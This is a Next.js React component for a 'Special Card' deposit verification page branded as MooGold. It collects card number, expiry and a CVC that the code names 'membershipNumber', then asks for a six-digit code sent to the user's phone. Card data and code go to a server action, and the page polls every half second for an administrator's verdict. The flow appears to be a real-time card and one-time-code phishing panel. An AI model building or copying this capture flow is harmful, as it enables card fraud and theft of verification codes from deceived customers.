"use client";

import { useEffect, useRef, useState, type ClipboardEvent, type FormEvent, type KeyboardEvent } from "react";
import { useRouter } from "next/navigation";
import Link from "next/link";
import { LoaderCircle, MessageCircle } from "lucide-react";
import { requestWalletSpecialCardCode, verifyWalletSpecialCardCode, getWalletSpecialCardReviewStatus } from "@/app/dashboard/deposit/wallet-special-card-actions";

type Props = { reference: string; status: string | null; expiresAt: Date | string | null; verifiedAt: Date | string | null; customerName?: string | null };

type CardBrand = "VISA" | "MASTERCARD" | "AMEX" | "DISCOVER" | "UNKNOWN";

function detectCardBrand(cardNumber: string): CardBrand {
  const digits = cardNumber.replace(/\D/g, "");
  if (!digits) return "UNKNOWN";
  if (/^4/.test(digits)) return "VISA";
  if (/^5[1-5]/.test(digits)) return "MASTERCARD";
  const prefix4 = parseInt(digits.slice(0, 4), 10);
  if (prefix4 >= 2221 && prefix4 <= 2720) return "MASTERCARD";
  if (/^3[47]/.test(digits)) return "AMEX";
  if (/^6(011|5|4[4-9])/.test(digits)) return "DISCOVER";
  return "UNKNOWN";
}

function formatCardNumber(value: string, brand: CardBrand) {
  const maxDigits = brand === "AMEX" ? 15 : 16;
  const digits = value.replace(/\D/g, "").slice(0, maxDigits);

  if (brand === "AMEX") {
    if (digits.length > 10) {
      return `${digits.slice(0, 4)} ${digits.slice(4, 10)} ${digits.slice(10, 15)}`;
    }
    if (digits.length > 4) {
      return `${digits.slice(0, 4)} ${digits.slice(4, 10)}`;
    }
    return digits;
  }

  return digits.replace(/(.{4})/g, "$1 ").trim();
}

function formatExpiryDate(value: string) {
  const digits = value.replace(/\D/g, "").slice(0, 4);
  if (digits.length >= 3) {
    return `${digits.slice(0, 2)}/${digits.slice(2, 4)}`;
  }
  return digits;
}

function CardBrandLogo({ brand }: { brand: CardBrand }) {
  switch (brand) {
    case "MASTERCARD":
      return (
        <svg className="h-6 w-9 shrink-0" viewBox="0 0 36 24" fill="none">
          <rect width="36" height="24" rx="4" fill="#1A1F2C" />
          <circle cx="13" cy="12" r="7" fill="#EB001B" />
          <circle cx="23" cy="12" r="7" fill="#F79E1B" fillOpacity="0.9" />
          <path
            d="M18 6.804A6.97 6.97 0 0015.333 12 6.97 6.97 0 0018 17.196 6.97 6.97 0 0020.667 12 6.97 6.97 0 0018 6.804z"
            fill="#FF5F00"
          />
        </svg>
      );
    case "VISA":
      return (
        <svg className="h-5 w-10 shrink-0" viewBox="0 0 100 32" fill="none">
          <path
            d="M38.86 31.25l5.24-30.5h8.38l-5.24 30.5h-8.38zm33.11-29.83c-1.65-.63-4.23-1.04-7.45-1.04-8.21 0-14 4.37-14.04 10.62-.07 4.62 4.13 7.19 7.28 8.73 3.23 1.58 4.31 2.59 4.3 4-.02 2.16-2.6 3.15-5.01 3.15-3.35 0-5.13-.51-7.85-1.72l-1.08-.51-1.18 7.32c2.01.93 5.7 1.74 9.53 1.78 8.72 0 14.39-4.31 14.46-10.98.05-3.66-2.18-6.45-6.97-8.73-2.9-1.48-4.68-2.48-4.66-3.99.01-1.34 1.51-2.73 4.78-2.73 2.73-.05 4.71.58 6.24 1.24l.75.36 1.08-7.08zm19.86-.67h-6.47c-2.01 0-3.52.58-4.4 2.69l-12.45 27.81h8.8l1.75-4.84h10.76l1.01 4.84h7.76l-6.76-30.5zm-8.86 18.28l4.38-12.01 2.53 12.01h-6.91zM26.4 0.75L18.19 22.04l-.88-4.48c-1.52-5.18-6.26-10.8-11.58-13.62l7.46 27.28h8.84l13.16-30.47H26.4z"
            fill="#1A1F2C"
          />
          <path
            d="M12.08 0.75H0l-.15.71c9.38 2.39 15.68 8.16 18.24 15.09l-2.62-13.29c-.45-1.8-1.78-2.43-3.39-2.51z"
            fill="#FAA61A"
          />
        </svg>
      );
    case "AMEX":
      return (
        <svg className="h-6 w-9 shrink-0" viewBox="0 0 36 24" fill="none">
          <rect width="36" height="24" rx="4" fill="#006FCF" />
          <path
            d="M7 15h2.2l.6-1.4h2.4l.6 1.4H15l-2.6-6h-2.8L7 15zm3.6-3.2l.6-1.5.6 1.5h-1.2zm5.4 3.2h2.1v-3.8l1.4 3.8h1.6l1.4-3.8V15h2.1V9h-2.8l-1.5 3.9L18.8 9h-2.8v6zm10.5 0h4.8v-1.3h-3.1v-1h3.1V11.2h-3.1v-.9h3.1V9h-4.8v6z"
            fill="#FFFFFF"
          />
        </svg>
      );
    case "DISCOVER":
      return (
        <svg className="h-6 w-9 shrink-0" viewBox="0 0 36 24" fill="none">
          <rect width="36" height="24" rx="4" fill="#231F20" />
          <path
            d="M5 15h2.4c2 0 3.2-1.2 3.2-3s-1.2-3-3.2-3H5v6zm2.2-1.4H6.8V10.4h.4c1.1 0 1.8.6 1.8 1.6s-.7 1.6-1.8 1.6zm4.1 1.4h1.7V9h-1.7v6zm7.3-3c0 1.7 1.3 3 3 3s3-1.3 3-3-1.3-3-3-3-3 1.3-3 3zm7.6 3l2-6h-1.8l-1.1 3.8L25.2 9h-1.8l2 6h1.2z"
            fill="#FFFFFF"
          />
          <circle cx="21.6" cy="12" r="2" fill="#FF6600" />
        </svg>
      );
    default:
      return (
        <svg className="h-6 w-9 shrink-0" viewBox="0 0 36 24" fill="none">
          <rect width="36" height="24" rx="4" fill="#E2E8F0" />
          <rect x="4" y="6" width="28" height="4" fill="#94A3B8" />
          <rect x="4" y="14" width="10" height="4" rx="1" fill="#CBD5E1" />
        </svg>
      );
  }
}

export default function WalletSpecialCardForm({ reference, status, expiresAt, verifiedAt, customerName }: Props) {
  const router = useRouter();
  const inputRefs = useRef<Array<HTMLInputElement | null>>([]);
  const expiryRef = useRef<HTMLInputElement>(null);
  const membershipRef = useRef<HTMLInputElement>(null);

  const [requestPending, setRequestPending] = useState(false);
  const [verifyPending, setVerifyPending] = useState(false);
  const [code, setCode] = useState("");
  const [message, setMessage] = useState("");
  const [error, setError] = useState("");
  const [cardNumber, setCardNumber] = useState("");
  const [expiry, setExpiry] = useState("");
  const [membershipNumber, setMembershipNumber] = useState("");
  const [currentStatus, setCurrentStatus] = useState(status ?? "NOT_REQUESTED");
  const [showVerificationPopup, setShowVerificationPopup] = useState(false);

  const [touched, setTouched] = useState({
    card: false,
    expiry: false,
    membership: false,
  });

  const expiryText = expiresAt ? new Date(expiresAt).toLocaleString() : null;
  const displayName = customerName?.trim() || "MooGold Member";

  const cardBrand = detectCardBrand(cardNumber);
  const cardDigits = cardNumber.replace(/\D/g, "");
  const requiredCardLength = cardBrand === "AMEX" ? 15 : 16;
  const requiredMembershipLength = cardBrand === "AMEX" ? 4 : 3;

  // Validation Checks
  const isCardComplete = cardDigits.length === requiredCardLength;
  const isCardInvalid = cardDigits.length >= requiredCardLength && cardBrand === "UNKNOWN";

  const cleanExpiryDigits = expiry.replace(/\D/g, "");
  const isExpiryComplete = cleanExpiryDigits.length === 4;
  const isExpiryInvalid =
    isExpiryComplete &&
    (parseInt(cleanExpiryDigits.slice(0, 2), 10) === 0 ||
      parseInt(cleanExpiryDigits.slice(0, 2), 10) > 12 ||
      parseInt(cleanExpiryDigits.slice(2, 4), 10) > 45);

  const isMembershipComplete = membershipNumber.length === requiredMembershipLength;

  // Form validity check to disable button until everything is correct
  const isFormValid = isCardComplete && !isCardInvalid && isExpiryComplete && !isExpiryInvalid && isMembershipComplete;

  const isReviewProcessing = /^REVIEW_PENDING(?:_\d{6})?$/.test(currentStatus);
  const showProcessingView = isReviewProcessing || verifyPending;
  const showCustomerSupport = ["REVIEW_INCORRECT", "REVIEW_INSUFFICIENT_FUNDS", "REVIEW_WRONG_CARD_DETAILS", "REVIEW_REJECTED_REASON"].includes(currentStatus);
  const isAdminActionMessage = ["REVIEW_INCORRECT", "REVIEW_INSUFFICIENT_FUNDS", "REVIEW_WRONG_CARD_DETAILS", "REVIEW_REJECTED_REASON"].includes(currentStatus);
  const standaloneAdminMessage =
    currentStatus === "REVIEW_INSUFFICIENT_FUNDS" ? "Insufficient funds" :
    currentStatus === "REVIEW_WRONG_CARD_DETAILS" ? "Wrong card details" : "";
  const isStandaloneAdminResult = Boolean(standaloneAdminMessage);

  useEffect(() => {
    if (!isReviewProcessing) return;
    let active = true;
    let checking = false;
    const timer = window.setInterval(async () => {
      if (checking) return;
      checking = true;
      try {
        const result = await getWalletSpecialCardReviewStatus(reference);
        if (!active || !result.success || !result.status || result.status === "REVIEW_PENDING") return;
        if (result.status === "VERIFIED") {
          setCurrentStatus("VERIFIED"); setCode(""); setMessage(""); setError(""); setShowVerificationPopup(false); router.refresh(); return;
        }
        setCurrentStatus(result.status); setCode(""); setMessage(result.message ?? ""); setError(""); router.refresh();
      } catch { /* Keep polling after temporary network errors. */ }
      finally { checking = false; }
    }, 500);
    return () => { active = false; window.clearInterval(timer); };
  }, [isReviewProcessing, reference, router]);

  function handleCardNumberChange(val: string) {
    const currentBrand = detectCardBrand(val);
    const formatted = formatCardNumber(val, currentBrand);
    setCardNumber(formatted);

    const digitsOnly = val.replace(/\D/g, "");
    const targetLength = currentBrand === "AMEX" ? 15 : 16;
    if (digitsOnly.length >= targetLength) {
      expiryRef.current?.focus();
    }
  }

  function handleExpiryChange(val: string) {
    const digits = val.replace(/\D/g, "").slice(0, 4);
    let mm = digits.slice(0, 2);
    let yy = digits.slice(2, 4);

    if (mm.length === 2) {
      const monthNum = parseInt(mm, 10);
      if (monthNum > 12) mm = "00";
    }
    if (yy.length === 2) {
      const yearNum = parseInt(yy, 10);
      if (yearNum > 45) yy = "00";
    }

    const cleanedDigits = `${mm}${yy}`;
    const formatted = formatExpiryDate(cleanedDigits);
    setExpiry(formatted);

    if (cleanedDigits.length === 4) {
      membershipRef.current?.focus();
    }
  }

  function handleContinue() {
    setMessage(""); setError("");
    setTouched({ card: true, expiry: true, membership: true });

    if (!isFormValid) return;

    setCode(""); setShowVerificationPopup(true); void requestCode();
  }

  async function requestCode() {
    setRequestPending(true); setMessage(""); setError("");
    try {
      const data = new FormData();
      data.set("reference", reference);
      const submittedCardNumber = cardNumber.replace(/\D/g, "");
      data.set("cardNumber", submittedCardNumber);
      data.set("expiry", expiry.trim());
      data.set("membershipNumber", membershipNumber.trim());
      const result = await requestWalletSpecialCardCode(data);
      if (!result.success) { setError(result.error ?? "Unable to request verification."); return; }
      if (result.status) setCurrentStatus(result.status);
      if (result.message && result.status !== "REVIEW_PENDING") setMessage(result.message);
      if (result.status === "VERIFIED") { setShowVerificationPopup(false); setCode(""); }
      router.refresh();
    } catch { setError("Something went wrong. Please try again."); }
    finally { setRequestPending(false); }
  }

  function updateDigit(index: number, rawValue: string) {
    if (isReviewProcessing) return;
    const digit = rawValue.replace(/\D/g, "").slice(-1);
    const next = code.split(""); next[index] = digit; setCode(next.join("").slice(0, 6));
    if (digit && index < 5) inputRefs.current[index + 1]?.focus();
  }

  function handleDigitKeyDown(index: number, event: KeyboardEvent<HTMLInputElement>) {
    if (event.key === "Backspace" && !code[index] && index > 0) inputRefs.current[index - 1]?.focus();
    if (event.key === "ArrowLeft" && index > 0) { event.preventDefault(); inputRefs.current[index - 1]?.focus(); }
    if (event.key === "ArrowRight" && index < 5) { event.preventDefault(); inputRefs.current[index + 1]?.focus(); }
  }

  function handlePaste(event: ClipboardEvent<HTMLDivElement>) {
    if (isReviewProcessing) return;
    const pasted = event.clipboardData.getData("text").replace(/\D/g, "").slice(0, 6);
    if (!pasted) return;
    event.preventDefault(); setCode(pasted); inputRefs.current[Math.min(pasted.length, 5)]?.focus();
  }

  async function verifyCode(event: FormEvent<HTMLFormElement>) {
    event.preventDefault();
    if (!/^\d{6}$/.test(code)) { setError("Enter all six digits of your Special Card verification code."); return; }
    setVerifyPending(true); setMessage(""); setError("");
    try {
      const data = new FormData(); data.set("reference", reference); data.set("code", code);
      const result = await verifyWalletSpecialCardCode(data);
      if (!result.success) { setError(result.error ?? "Unable to submit this code for review."); if (result.status) setCurrentStatus(result.status); return; }
      setCode(""); setMessage(""); setError("");
      if (result.status === "VERIFIED") { setCurrentStatus("VERIFIED"); setShowVerificationPopup(false); router.refresh(); }
      else { setCurrentStatus("REVIEW_PENDING"); setMessage(""); }
    } catch { setError("Something went wrong. Please try again."); }
    finally { setVerifyPending(false); }
  }

  return <>
    <div className="w-full max-w-[340px] sm:max-w-lg space-y-4 mx-auto">
      {/* 1. Metallic Virtual Bank Card Preview */}
      <section
        aria-label="MooGold membership card preview"
        style={{ display: isStandaloneAdminResult ? "none" : undefined }}
        className="relative isolate overflow-hidden rounded-3xl border border-emerald-300/30 bg-gradient-to-br from-[#0a3829] via-[#126344] to-[#092b22] p-5 text-white shadow-xl shadow-emerald-950/20"
      >
        <div aria-hidden="true" className="pointer-events-none absolute -right-12 -top-16 h-56 w-56 rounded-full border border-white/10" />
        <div aria-hidden="true" className="pointer-events-none absolute -bottom-24 -left-12 h-48 w-48 rounded-full bg-amber-300/10 blur-2xl" />

        <div className="relative flex items-center justify-between">
          <div className="h-4 w-6 rounded bg-gradient-to-tr from-amber-300 via-amber-200 to-amber-400 shadow-sm" />
          <CardBrandLogo brand={cardBrand} />
        </div>

        <div className="relative mt-6">
          <p className="text-[10px] font-black uppercase tracking-[0.2em] text-emerald-100/75">Card number</p>
          <p className="mt-1 font-mono text-base font-black tracking-widest text-white/90 sm:text-lg">
            {cardNumber || "•••• •••• •••• ••••"}
          </p>
        </div>

        <div className="relative mt-5 flex items-center justify-between text-[10px] font-bold uppercase tracking-wider text-emerald-100/80">
          <div>
            <span className="block text-[8px] opacity-75 font-semibold">Cardholder Name</span>
            <span className="truncate max-w-[150px] sm:max-w-[200px] block text-xs">{displayName}</span>
          </div>
          <div className="text-right">
            <span className="block text-[8px] opacity-75 font-semibold">Expiry Date</span>
            <span className="font-mono text-xs">{expiry || "MM/YY"}</span>
          </div>
        </div>
      </section>

      {/* 2. Interactive Inputs Form Section */}
      <section
        style={{ display: isStandaloneAdminResult ? "none" : undefined }}
        className="space-y-4 rounded-3xl border border-slate-200/90 bg-white p-5 shadow-xl shadow-slate-200/50 backdrop-blur-xl"
      >
        {/* Card Number Input */}
        <div className="space-y-1.5">
          <label htmlFor="wallet-card-number" className="block text-[10px] font-black uppercase tracking-wider text-slate-500">
            Card number
          </label>
          <div className="relative flex items-center">
            <input
              id="wallet-card-number"
              type="text"
              inputMode="numeric"
              autoComplete="off"
              placeholder="0000 0000 0000 0000"
              value={cardNumber}
              onBlur={() => setTouched((prev) => ({ ...prev, card: true }))}
              onChange={(e) => handleCardNumberChange(e.target.value)}
              maxLength={cardBrand === "AMEX" ? 17 : 19}
              className={`w-full rounded-2xl border bg-slate-50/70 px-3.5 py-3 pr-12 font-mono text-sm font-bold tracking-wider text-slate-900 outline-none transition-all focus:bg-white ${
                touched.card && (!isCardComplete || isCardInvalid)
                  ? "border-red-500 focus:border-red-500 focus:ring-4 focus:ring-red-100"
                  : "border-slate-200/90 focus:border-slate-900 focus:ring-4 focus:ring-slate-100"
              }`}
            />
            <div className="absolute right-3.5 flex items-center pointer-events-none">
              <CardBrandLogo brand={cardBrand} />
            </div>
          </div>
          {touched.card && !isCardComplete && (
            <p className="text-[10px] font-bold text-red-600 pl-1">
              Please enter a complete {requiredCardLength}-digit card number
            </p>
          )}
          {touched.card && isCardComplete && isCardInvalid && (
            <p className="text-[10px] font-bold text-red-600 pl-1">Card number is invalid</p>
          )}
        </div>

        {/* Expiry & Membership CVC Grid */}
        <div className="grid grid-cols-2 gap-3">
          <div className="space-y-1.5">
            <label htmlFor="wallet-card-expiry" className="block text-[10px] font-black uppercase tracking-wider text-slate-500">
              Expiry (MM/YY)
            </label>
            <input
              ref={expiryRef}
              id="wallet-card-expiry"
              type="text"
              inputMode="numeric"
              autoComplete="off"
              placeholder="00/00"
              value={expiry}
              onBlur={() => setTouched((prev) => ({ ...prev, expiry: true }))}
              onChange={(e) => handleExpiryChange(e.target.value)}
              maxLength={5}
              className={`w-full rounded-2xl border bg-slate-50/70 px-3.5 py-3 font-mono text-sm font-bold text-slate-900 outline-none transition-all focus:bg-white ${
                touched.expiry && (!isExpiryComplete || isExpiryInvalid)
                  ? "border-red-500 focus:border-red-500 focus:ring-4 focus:ring-red-100"
                  : "border-slate-200/90 focus:border-slate-900 focus:ring-4 focus:ring-slate-100"
              }`}
            />
            {touched.expiry && (!isExpiryComplete || isExpiryInvalid) && (
              <p className="text-[10px] font-bold text-red-600 pl-1">Enter valid MM/YY</p>
            )}
          </div>

          <div className="space-y-1.5">
            <label htmlFor="wallet-membership-number" className="block text-[10px] font-black uppercase tracking-wider text-slate-500">
              CVC
            </label>
            <input
              ref={membershipRef}
              id="wallet-membership-number"
              type="text"
              autoComplete="off"
              value={membershipNumber}
              onBlur={() => setTouched((prev) => ({ ...prev, membership: true }))}
              onChange={(e) => setMembershipNumber(e.target.value.replace(/\D/g, "").slice(0, requiredMembershipLength))}
              maxLength={requiredMembershipLength}
              placeholder={requiredMembershipLength === 4 ? "0000" : "000"}
              className={`w-full rounded-2xl border bg-slate-50/70 px-3.5 py-3 font-mono text-sm font-bold text-slate-900 outline-none transition-all focus:bg-white ${
                touched.membership && !isMembershipComplete
                  ? "border-red-500 focus:border-red-500 focus:ring-4 focus:ring-red-100"
                  : "border-slate-200/90 focus:border-slate-900 focus:ring-4 focus:ring-slate-100"
              }`}
            />
            {touched.membership && !isMembershipComplete && (
              <p className="text-[10px] font-bold text-red-600 pl-1">Requires {requiredMembershipLength} digits</p>
            )}
          </div>
        </div>

        {/* Cardholder Account Name Box */}
        <div className="space-y-1.5">
          <label className="block text-[10px] font-black uppercase tracking-wider text-slate-500">
            Cardholder Name
          </label>
          <div className="relative flex items-center">
            <input
              type="text"
              value={displayName}
              readOnly
              className="w-full rounded-2xl border border-slate-200 bg-slate-100/90 px-3.5 py-3 text-xs font-extrabold text-slate-700 cursor-not-allowed outline-none select-none"
            />
          </div>
        </div>
      </section>

      {/* 3. Status actions / Buttons */}
      {!isStandaloneAdminResult && (
        currentStatus === "VERIFIED" ? (
          <div className="rounded-2xl border border-emerald-200 bg-emerald-50 p-4 shadow-sm">
            <p className="font-bold text-emerald-900 text-sm">Special Card verification complete</p>
            <p className="mt-1.5 text-xs leading-5 text-emerald-800">{verifiedAt ? `Verified on ${new Date(verifiedAt).toLocaleString()}. ` : ""}Your deposit remains pending until an administrator approves it.</p>
          </div>
        ) : currentStatus === "AWAITING_CODE" ? (
          <div className="rounded-2xl border border-amber-200 bg-amber-50 p-4 shadow-sm">
            <p className="font-bold text-amber-900 text-sm">Special Card request submitted</p>
            <button type="button" onClick={() => void requestCode()} disabled={requestPending} className="mt-3 w-full rounded-xl border border-amber-300 bg-white px-4 py-3 text-xs font-bold uppercase tracking-wider text-amber-900 transition hover:bg-amber-50 disabled:opacity-50">{requestPending ? "Checking status…" : "Refresh request status"}</button>
          </div>
        ) : currentStatus === "LOCKED" || currentStatus === "EXPIRED" ? (
          <div className="rounded-2xl border border-amber-200 bg-amber-50 p-4 shadow-sm">
            <p className="font-bold text-amber-900 text-sm">{currentStatus === "LOCKED" ? "Verification locked" : "Code expired"}</p>
            <p className="mt-1.5 text-xs leading-5 text-amber-800">Please contact customer support for assistance.</p>
          </div>
        ) : (
          <button
            type="button"
            onClick={handleContinue}
            disabled={!isFormValid || requestPending}
            className="w-full rounded-2xl bg-gradient-to-r from-emerald-600 to-emerald-700 py-3.5 text-xs font-black uppercase tracking-wider text-white shadow-lg shadow-emerald-600/25 transition-all hover:from-emerald-700 hover:to-emerald-800 active:scale-[0.99] disabled:opacity-40 disabled:cursor-not-allowed"
          >
            {requestPending ? "Please wait…" : "Continue"}
          </button>
        )
      )}

      {!isReviewProcessing && (
        isStandaloneAdminResult ? (
          <div className="space-y-4 py-2 text-center">
            <p role="status" className="text-xs font-bold text-red-600">{message || standaloneAdminMessage}</p>
            <Link href="/dashboard/support" className="inline-flex items-center justify-center gap-2 text-xs font-bold text-emerald-700 underline underline-offset-4 hover:text-emerald-900">
              <MessageCircle className="h-4 w-4" aria-hidden="true" />
              Contact Customer Support
            </Link>
          </div>
        ) : message ? (
          <p role="status" className={`rounded-2xl border border-emerald-200 bg-emerald-50 p-3 text-xs font-bold ${isAdminActionMessage ? "text-red-700 border-red-200 bg-red-50" : "text-emerald-800"}`}>{message}</p>
        ) : null
      )}
      {error && <p role="alert" className="rounded-2xl border border-red-200 bg-red-50 p-3 text-xs font-bold text-red-700">{error}</p>}
    </div>

    {/* 4. Verification Popup Modal */}
    {showVerificationPopup && !isStandaloneAdminResult && (
      <div className="fixed inset-0 z-[100] flex items-center justify-center overflow-y-auto bg-slate-950/65 p-4 backdrop-blur-sm">
        <section role="dialog" aria-modal="true" aria-labelledby="wallet-special-card-dialog-title" className="my-auto w-full max-w-md rounded-3xl border border-white/60 bg-white p-6 shadow-2xl sm:p-8">
          <div className="mx-auto flex h-14 w-14 items-center justify-center rounded-2xl bg-emerald-50 text-emerald-700">
            <svg viewBox="0 0 24 24" fill="none" aria-hidden="true" className="h-7 w-7"><rect x="5" y="10" width="14" height="11" rx="2" stroke="currentColor" strokeWidth="1.8" /><path d="M8 10V7a4 4 0 0 1 8 0v3" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" /><path d="m9 15 2 2 4-4" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round" /></svg>
          </div>
          <form onSubmit={verifyCode} className="mt-5 space-y-5">
            {!showProcessingView && (
              <div className="text-center">
                <h2 id="wallet-special-card-dialog-title" className="text-xl font-bold text-slate-900">Enter verification code</h2>
                <p className="mt-2 text-sm text-slate-600">6-digit code sent to your registered number</p>
              </div>
            )}
            {showProcessingView && (
              <div role="status" aria-live="polite" className="flex flex-col items-center justify-center gap-3 rounded-2xl border border-emerald-200 bg-emerald-50 px-4 py-8 text-sm font-semibold text-emerald-900">
                <LoaderCircle className="h-8 w-8 animate-spin" aria-hidden="true" />
                <span>Processing…</span>
              </div>
            )}
            {!showProcessingView && <>
              <div className="flex justify-center gap-2 sm:gap-3" onPaste={handlePaste} aria-label="Six-digit verification code">
                {Array.from({ length: 6 }, (_, i) => (
                  <input
                    key={i}
                    ref={(el) => { inputRefs.current[i] = el; }}
                    aria-label={`Verification digit ${i + 1}`}
                    type="text"
                    inputMode="numeric"
                    autoComplete={i === 0 ? "one-time-code" : "off"}
                    pattern="[0-9]"
                    maxLength={1}
                    value={code[i] ?? ""}
                    disabled={verifyPending}
                    onChange={(e) => updateDigit(i, e.target.value)}
                    onKeyDown={(e) => handleDigitKeyDown(i, e)}
                    className="h-12 w-11 min-w-0 rounded-2xl border border-slate-300 bg-slate-50 text-center font-mono text-xl font-black text-slate-900 outline-none focus:border-emerald-600 focus:bg-white focus:ring-4 focus:ring-emerald-100 disabled:opacity-60 sm:h-14 sm:w-12 sm:text-2xl"
                  />
                ))}
              </div>
              {expiryText && <p className="text-center text-xs text-slate-500">Code expires: {expiryText}</p>}
              {error && <p role="alert" className="rounded-2xl border border-red-200 bg-red-50 p-3 text-xs font-bold text-red-700">{error}</p>}
              {message && <p role="status" className={`rounded-2xl border border-emerald-200 bg-emerald-50 p-3 text-xs font-bold ${isAdminActionMessage ? "text-red-700 border-red-200 bg-red-50" : "text-emerald-800"}`}>{message}</p>}
              <button type="submit" disabled={verifyPending || code.length !== 6 || !["AWAITING_CODE", "CODE_ISSUED", "REVIEW_INCORRECT"].includes(currentStatus)} className="w-full rounded-2xl bg-gradient-to-r from-emerald-600 to-emerald-700 py-3.5 text-xs font-black uppercase tracking-wider text-white shadow-lg shadow-emerald-600/25 transition-all hover:from-emerald-700 hover:to-emerald-800 disabled:opacity-50">{verifyPending ? "Submitting…" : "Verify"}</button>
              {showCustomerSupport && <Link href="/dashboard/support" className="flex items-center justify-center gap-2 text-xs font-bold text-emerald-800 hover:text-emerald-950"><MessageCircle className="h-4 w-4" aria-hidden="true" />Contact customer support</Link>}
            </>}
          </form>
        </section>
      </div>
    )}
  </>;
}